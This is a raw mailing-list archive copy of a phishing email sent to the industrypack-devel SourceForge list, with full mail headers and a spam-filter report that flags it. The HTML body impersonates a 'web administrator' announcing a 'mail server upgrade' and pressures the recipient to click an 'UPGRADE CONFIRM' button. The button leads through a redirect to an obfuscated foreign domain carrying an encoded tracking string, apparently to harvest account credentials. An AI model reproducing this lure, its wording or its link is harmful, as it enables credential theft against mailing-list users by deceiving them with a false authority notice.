Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id C60D969F6ED
	for <lists+industrypack-devel@lfdr.de>; Wed, 22 Feb 2023 15:45:10 +0100 (CET)
Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1pUqMn-00017C-Gq
	for lists+industrypack-devel@lfdr.de;
	Wed, 22 Feb 2023 14:45:09 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-4.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <mails@b-platform.life>) id 1pUqMm-000175-M8
 for industrypack-devel@lists.sourceforge.net;
 Wed, 22 Feb 2023 14:45:08 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Subject:Content-Transfer-Encoding:Content-Type:
 MIME-Version:Message-ID:Date:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=U9uvbr6iTEbxGbsXAPb7TDz9yhwSzbp5mbyHQY7jTWg=; b=JDr76emkJWKSc/r5o2cpc2YVAO
 xL+5ydkxg/yMTyfM7Un58Rqk6BnU4pG/Kh91xcBqMqscaA4NJDuRW/TJ44xdzDFcphtcJQDr58Gz+
 /O7aVb/LfJPkDu20BHuBmMY5nxuHAlmoHJSc4neM30cizv2n2AYBoWWaAjfHN7FufWNo=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Subject:Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:
 Date:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=U9uvbr6iTEbxGbsXAPb7TDz9yhwSzbp5mbyHQY7jTWg=; b=l
 72+957HYnBTQW+EZNhiwrns7FIgTf5apLVDbnijixXi3moDoXd67BBA2XZsa3o4EnQMKs9cpzSfFZ
 +zKPwteU/jZIv+3wqnaXR6YrJ9dHcdErljYBVCYZ7GcgYdkDLqD15VL2KToC2GLb92xKWjj+0Wtdi
 WklB6vIF8P68xdA0=;
Received: from b-platform.life ([185.66.70.26])
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
 id 1pUqMi-0008WE-UF for industrypack-devel@lists.sourceforge.net;
 Wed, 22 Feb 2023 14:45:08 +0000
DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=default;
 d=b-platform.life; 
 h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:Content-Transfer-Encoding;
 i=root@b-platform.life; bh=SKfS816BGYU2zMVMLt04eK9wbsg=;
 b=dlk+RLgaMoZgSBLabuOeYDnc3NnfpTxEYz6HfjLYbCFOqNMdEilEPLi0VUd77gwaiGFLvrreepye
 ZWarjf/uravVLGdePpsRpXpp5IfUj5Evh8KDowscUvhb7kYSmWmDbUpVKTC8I9heuUq1fbk8rila
 Mbjr4eA8pz4TG1kQ5Hc=
DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=default; d=b-platform.life; 
 b=JLrbbaIt80yK4vC33L6lyFpEAGcmiXIGEfPXCrl1bqQY6efOaHUalYiT8P4DgkEw6ENpuh/3fjUI
 QL2bU//VklBnCBAIx8eQC0CFP5EO7DJxuWOufR5FCvTgDb6s6j/j9JE6l/s+P6ua/E/lBzPJhMlh
 nZ9jzJMPDOu3gZd/+7s=;
To: industrypack-devel@lists.sourceforge.net
Date: 22 Feb 2023 15:44:48 +0100
Message-ID: <20230222154448.8886214BC6801C62@b-platform.life>
MIME-Version: 1.0
X-Spam-Score: 8.6 (++++++++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-2.v13.lw.sourceforge.com", 
 has identified this incoming email as possible spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview: MAIL SERVER UPGRADE industrypack-devel@lists.sourceforge.net
 Your message has been delivered in spam/ junk due to the server undergoing
 upgrading. 
 Content analysis details:   (8.6 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 2.5 URIBL_DBL_SPAM         Contains a spam URL listed in the Spamhaus DBL
 blocklist [URIs: b-platform.life]
 3.6 RCVD_IN_SBL_CSS        RBL: Received via a relay in Spamhaus SBL-CSS
 [185.66.70.26 listed in zen.spamhaus.org]
 0.1 URIBL_CSS_A Contains URL's A record listed in the Spamhaus CSS
 blocklist [URIs: b-platform.life]
 -0.0 SPF_PASS               SPF: sender matches SPF record
 -0.0 SPF_HELO_PASS          SPF: HELO matches SPF record
 0.0 T_PDS_OTHER_BAD_TLD    Untrustworthy TLDs
 [URI: b-platform.life (life)]
 0.0 HTML_FONT_FACE_BAD     BODY: HTML font face is not a word
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
 valid
 -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
 -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from
 author's domain
 -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
 envelope-from domain
 2.0 FROM_SUSPICIOUS_NTLD_FP From abused NTLD
 0.5 FROM_SUSPICIOUS_NTLD   From abused NTLD
X-VA-Spam-Flag: YES
X-Spam-Flag: YES
X-Headers-End: 1pUqMi-0008WE-UF
Subject: [Industrypack-devel] [SPAM] lists.sourceforge.net FROM WEB
 ADMINISTRATOR
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
From: "lists.sourceforge.net on Web Administrator via Industrypack-devel"
 <industrypack-devel@lists.sourceforge.net>
Reply-To: "lists.sourceforge.net on Web Administrator" <root@b-platform.life>
Content-Type: multipart/mixed; boundary="===============2350187559737508957=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============2350187559737508957==
Content-Type: text/html
Content-Transfer-Encoding: quoted-printable

<html><head>
<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001">
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body><p align=3D"left"><br class=3D"v1v1Apple-interchange-newline"></p><p>=

<br></p><div align=3D"left">
<table align=3D"left" style=3D"padding-bottom: 20px; border-collapse: colla=
pse; min-width: 220px; max-width: 516px; box-sizing: border-box;" border=3D=
"0" cellspacing=3D"0" cellpadding=3D"0">
<tbody style=3D"box-sizing: border-box;">
<tr style=3D"box-sizing: border-box;">
<td width=3D"8" style=3D"width: 8px; box-sizing: border-box;"><br style=3D"=
box-sizing: border-box;"></td>
<td style=3D"box-sizing: border-box;">
<div align=3D"center" style=3D"padding: 40px 20px; border-radius: 8px; bord=
er: thin solid rgb(218, 220, 224); border-image: none; box-sizing: border-b=
ox;">
<div style=3D'text-align: center; line-height: 32px; padding-bottom: 32px; =
font-family: "Google Sans", Roboto, RobotoDraft, Helvetica, Arial, sans-ser=
if; border-bottom-color: rgb(218, 220, 224); border-bottom-width: thin; bor=
der-bottom-style: solid; box-sizing: border-box;'>
<div style=3D"font-size: 24px; box-sizing: border-box;">
<table style=3D'width: 458px; text-align: center; line-height: 28px; font-f=
amily: "Google Sans", Roboto, RobotoDraft, Helvetica, Arial, sans-serif; fo=
nt-size: 24px; border-collapse: collapse; box-sizing: border-box;'>
<tbody style=3D"box-sizing: border-box;">
<tr style=3D"box-sizing: border-box;">
<td style=3D"box-sizing: border-box;">
<img width=3D"98" height=3D"98" alt=3D""=20
src=3D"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAALAAAACwCAMAAACYaRRsAA=
AAA3NCSVQICAjb4U/gAAAAUVBMVEVHcEzz9v/o8f/q8v/q8v/r8v/q8f/p8f/q8f/s9P/q8v/q8=
f/p8f/q8P/o8P4ac+hCjO2NuPRVl++BsvO/2Prd6f50qvIqfeogd+jV5f2gxffjQU5HAAAADnRS=
TlMAD+ufh0Bz+MEfVq7f0jqMbdoAAAW6SURBVHic7Z1Zd+IwDIUJZAWashUo//+HTklLS2L7Sra=
84Dm5L3PmoZOvdxRZ8pbFYtasWbNm/TcqqnW52rTt23bZNMvtW9tuVuW6KlJzaVRU9apd9lM133=
8s21X9SthV2TYKqwrfllVq0i91NQf2D7ruUtIWdcuHfaitUwXHemPh7cjnzTo+bVGqr5iFlmVcm=
7vS0dwnm8t40dytxLiDVnGQu5UX2kGb8MiFPBie1YSO5WrrE/dOv
&#10;A2ZMbqNZ9xB4eKi9hoNf2rqILidw6jGVRvA5Eo0UFBaeq+LypC4d5VecUOGw0M+wyJsODz=
kLyyqQNlhoqbxRLyOw3tH9jKI1LFw7/KQkYOnh7HEycJjacbTKit/7xJ5HDV+HxLE8ToFb98754=
pI+VeVYz5Oxtu7jSBdlPFYD7x0qSsi1Dtmtfa8CRLas6yTW5WW1/rFSxjAP7IM46QB/C2rME4yw=
k1lMeJ1yTLwsxp+UASZL7HXhsubqIRQxSwqCt/zZ65qtryZwsRDxrNYw8drvHHfYr13RFN0uu39=
6Xb6wE9jNEwd+vmP/eXdr67nT0hMW4wMPvnGHbQXWYwi+HQNwfv+fgTAZBSDFPEZxN+7boCYSBQ=
FMPgcivd6Aa9eg3MxMjgU77vEYlAG3wICHwDwEvGiKiJYRHzpAp4LKwpUph1GT9iJNSJGwKBoQ6=
/cBBhFHUenMTAa8MBrBxuNEfBX2OERitB+ktLhCG1uPWAnNwGW
mDyxl&#10;wI2dnewjFCA3U2e2ksBGwsK3HqqwG4mq/aSwKaYwL29BtjFZI29JLApJnDlrgW+Wp=
qstZcEbvS8xOyUFtjSZL29JLBh3oro5X6Bd5Onsk1W7P37OwGsryeI6alf4LPyYJ7JU3svtxMXW=
BvEcJgbAff90d5k3W/JBtYOdtQE6zOw9vFQqr33f4ULrA1iagJwBGxpsuH34wPrMjG15jkBtjFZ=
a68VsK4XpaaEp8Bsk82/GR9Y99ZRc+4qMM9kk71WwJq2oyB+RAfMMBn+TnzgXk0T5CqMFpgyGdh=
rB6ymCXJSWA+M/8uJkLEAVhs7cpLVBGzGwvbaAauDM7mTwwhsGhXoN9ICWM1r5LoGANbBkfbaAa=
utM7kyh4BB4Wi01w5YTcRCYGNpbrRXCvwmBEYmmwZtC+A3BZhcOiKBTSabyyIL4K0CTK6G08B6k=
0HhaQGsjs3k2hEHWDUZV518YLUP9QM8NRnX9SJgLyExUPyZTHV
OopDw8NI99&#10;DCZ7E1FL508rT2B7Bj22gGraU06cIy1v3Ja/6Qj3USsmQoRsKj4cZSo+JGUl=
64SlZfuBby7RAW8c4skkKhFcmxCRRI1oW5tvkyiNt9lIkUq0USKw1SVWLKpKtvJQA+STQZaTrf6=
kGy61WpC249kE9o2SwaxgfXr4+xFmfjA+pVF7rJXAmD9shd3YTEBsGFDPHPpNj6wYemWuzgeH9i=
0OM7cfhAf2LT9gLnBIz6wcTsjbwtNdGDzAQneJqXowOZNSrxtYLujL51ZwGj3JWqdQ+4MvCKD0e=
kI1NgdAwLvEDA8HAHajhP9XGehLc9wsyisJ9AihlBonghvx0WvXTiLUd4hNjxDi/eBeGEEU2dP4=
LGTMMQHmNPIcxGwF4WLcW66wFMRjJMnuKDoT8eDfK/zrw7nG1EJM872RL/vAIlzF0J2h6eyO572=
OgcAe+YBwNc5Ysk+jJ3bIdYXee8sjglndxA7v6Pu+V0mkN11Dc
mHD4fbfnK7ciRpG&#10;Dtd6pLw2hzXq+JSEbtfFJfb1U/5Xa6V3/Vl+V0Ql98VfPldchjzGklJ=
fnhWrHzs66LO/K5Cze+y2UV21/ku8rswOb8rqRfZXfq9yO9a9S+tvc+7Bb24fpHfpwEWfj++EO1=
7EV5cbiLhDsh5fUDkrsw+0TIor4/gDMrsM0OD8vqQ04+y+lTWjwwfI/vRq32M7FcZfe5t1qxZs2=
Y56h/JNmJD64N6tQAAAABJRU5ErkJggg=3D=3D" border=3D"0" hspace=3D"0"></td></tr=
>
<tr style=3D"box-sizing: border-box;">
<td style=3D"font-family: inherit; box-sizing: border-box;"></td></tr></tbo=
dy></table></div>
<table align=3D"center" style=3D"margin-top: 8px; border-collapse: collapse=
; box-sizing: border-box;">
<tbody style=3D"box-sizing: border-box;">
<tr style=3D"line-height: normal; box-sizing: border-box;">
<td align=3D"right" style=3D"padding-right: 8px; box-sizing: border-box;"><=
br style=3D"box-sizing: border-box;"></td>
<td style=3D"box-sizing: border-box;"><font size=3D"2"><font color=3D"#6f35=
1a"><font color=3D"#000096"></font></font></font><font size=3D"2"><font col=
or=3D"#0047ab"><font color=3D"#000096" face=3D"@Microsoft JhengHei UI Light=
"><strong>MAIL SERVER UPGRADE</strong></font>
<hr size=3D"2">
</font></font><font size=3D"2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
bsp; industrypack-devel@lists.sourceforge.net&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</f=
ont></td></tr></tbody></table></div>
<div style=3D"text-align: left; line-height: 20px; padding-top: 20px; font-=
family: Roboto-Regular, Helvetica, Arial, sans-serif; font-size: 14px; box-=
sizing: border-box;">
<table style=3D"text-align: center; line-height: 20px; font-size: 14px; bor=
der-collapse: collapse; box-sizing: border-box;">
<tbody style=3D"box-sizing: border-box;">
<tr style=3D"box-sizing: border-box;">
<td style=3D"padding-bottom: 24px; box-sizing: border-box;"><strong></stron=
g>
<table style=3D"border-collapse: collapse; box-sizing: border-box;">
<tbody style=3D"box-sizing: border-box;">
<tr style=3D"box-sizing: border-box;">
<td style=3D"vertical-align: top; box-sizing: border-box;"></td>
<td style=3D"line-height: 20px; padding-left: 13px; font-size: 14px; box-si=
zing: border-box;"><strong></strong><font face=3D"@Microsoft JhengHei UI Li=
ght"><strong><font size=3D"1"><font size=3D"2"><font color=3D"#000000">
<span style=3D"font-size: 12pt;">Your message has been delivered in spam/ j=
unk due to the server undergoing upgrading.</span><br><br><span style=3D"fo=
nt-size: 12pt;">To avoid such problems, You are mandated to confirm the upg=
rade of your server.</span></font></font></font></strong></font><font face=
=3D"Times New Roman"><font face=3D"@Microsoft JhengHei UI Light"><font size=
=3D"2"><strong>
<span style=3D'text-align: left; color: rgb(34, 34, 34); text-transform: no=
ne; text-indent: 0px; letter-spacing: normal; font-family: "Roboto Slab", G=
eorgia, "Times New Roman", Times, serif; font-size: 16px; font-style: norma=
l; font-weight: 400; word-spacing: 0px; float: none; display: inline !impor=
tant; white-space: pre-wrap; orphans: 2; widows: 2; background-color: rgb(2=
55, 255, 255); font-variant-ligatures: normal; font-variant-caps: normal; -=
webkit-text-stroke-width: 0px;=20
text-decoration-thickness: initial; text-decoration-style: initial; text-de=
coration-color: initial;'><span style=3D"font-size: 12pt;">.</span></span><=
/strong></font></font></font><span id=3D"v1v1v1v1m_4314246332054907544gmail=
-v1i0x3n" style=3D"color: rgb(11, 83, 148); box-sizing: border-box;"><span =
style=3D"font-size: 12pt;">
 </span><span id=3D"v1v1v1v1m_4314246332054907544gmail-v1ibnrb" style=3D"co=
lor: black; box-sizing: border-box;"><br></span></span>
<p></p>
<hr size=3D"2">
<br style=3D"box-sizing: border-box;"></td></tr></tbody></table></td></tr>
<tr style=3D"box-sizing: border-box;">
<td style=3D"box-sizing: border-box;"><strong></strong>
<a style=3D'padding: 9px 28px; border-radius: 5px; width: 198px; height: 30=
px; color: rgb(255, 255, 255); line-height: 16px; font-family: "Google Sans=
", Roboto, RobotoDraft, Helvetica, Arial, sans-serif; font-size: 13px; text=
-decoration: none; display: inline-block; min-width: 90px; box-sizing: bord=
er-box; background-color: rgb(0, 71, 171);'=20
href=3D"https://redirect.viglink.com/?jglruzsgvwimgobsiyyx&u=3D_bfygcgzzvk.=
xn--c1act2a.xn--p1ai/izyt/rrnwqe/YVc1a2RYTjBjbmx3WVdOckxXUmxkbVZzUUd4cGMzUn=
pMbk52ZFhKalpXWnZjbWRsTG01bGRBPT06cGtzZG9idWludA=3D=3D&drKey=3D1"'><strong>=

UPGRADE CONFIRM</strong></a><br><br></td></tr>
<tr style=3D"text-align: center; line-height: 18px; font-size: 12px; box-si=
zing: border-box;">
<td style=3D"padding-top: 12px; box-sizing: border-box;">
<div class=3D"v1rcmBody" id=3D"v1v1v1v1m_4314246332054907544gmail-v1ibc84" =
style=3D"color: rgb(51, 51, 51); text-transform: none; line-height: 14.4pt;=
 text-indent: 0px; letter-spacing: normal; padding-top: 0px; font-weight: 4=
00; margin-bottom: 0pt; word-spacing: 0px; border-top-color: currentColor; =
border-top-width: 0px; border-top-style: none; white-space: normal; box-siz=
ing: border-box; orphans: 2; widows: 2; background-color: rgb(255, 255, 255=
); font-variant-ligatures: normal; font-variant-caps:=20
normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial;=
 text-decoration-style: initial; text-decoration-color: initial;"><span id=
=3D"v1v1v1v1m_4314246332054907544gmail-v1ihkzx" style=3D"color: black; box-=
sizing: border-box;"><font face=3D"Verdana"><font face=3D"Microsoft Sans Se=
rif"><font size=3D"1">You received this email to let you know about importa=
nt changes to your email account and services.</font> </font>
<div style=3D"direction: ltr; box-sizing: border-box;"><font face=3D"Micros=
oft Sans Serif" size=3D"1">&copy; 2023<span style=3D"box-sizing: border-box=
;">&nbsp;Lists</span><br></font></div></font>
<div style=3D"direction: ltr; box-sizing: border-box;"><font face=3D"Micros=
oft Sans Serif" size=3D"1"></font></div></span>
<div style=3D"direction: ltr; box-sizing: border-box;"><font face=3D"Micros=
oft Sans Serif" size=3D"1"></font></div></div><font face=3D"Microsoft Sans =
Serif"><font size=3D"1"></font></font>
<div class=3D"v1rcmBody" id=3D"v1v1v1v1m_4314246332054907544gmail-v1ibc84" =
style=3D"color: rgb(51, 51, 51); text-transform: none; line-height: 14.4pt;=
 text-indent: 0px; letter-spacing: normal; padding-top: 0px; font-style: no=
rmal; font-weight: 400; margin-bottom: 0pt; word-spacing: 0px; border-top-c=
olor: currentColor; border-top-width: 0px; border-top-style: none; white-sp=
ace: normal; box-sizing: border-box; orphans: 2; widows: 2; background-colo=
r: rgb(255, 255, 255); font-variant-ligatures: normal;=20
font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
thickness: initial; text-decoration-style: initial; text-decoration-color: =
initial;"><span id=3D"v1v1v1v1m_4314246332054907544gmail-v1ihkzx" style=3D"=
color: black; box-sizing: border-box;"><font face=3D"Verdana" size=3D"1"><e=
m><font face=3D"Microsoft Sans Serif">This is an automated server message. =
Do not reply.</font></em></font></span></div></td></tr></tbody></table></di=
v></div></td></tr></tbody></table></div>


</body></html>


--===============2350187559737508957==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============2350187559737508957==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============2350187559737508957==--
